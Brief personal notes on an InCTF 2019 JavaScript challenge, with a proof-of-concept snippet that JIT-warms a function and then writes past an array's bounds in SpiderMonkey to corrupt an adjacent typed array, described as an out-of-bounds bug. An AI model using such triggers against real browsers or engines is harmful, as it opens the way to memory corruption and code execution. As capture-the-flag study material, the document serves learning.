# Practice  with Poc
It is a javascript challenge come from InCTF 2019
help me understand Spidermonkey structure
```javascript=
blah = new Array()
blah.push(new Array(1.1,1.1))
blah.push(new Uint32Array(0x10))

function trigger(a1,a2){
  blah[0][a1]=1.337;
  for (let i=0; i<100000; i++){}
}

for(var i=0;i<100;i++) trigger(0)
trigger(2)
blah[1]
```

After Poc, it is an oob challenge.
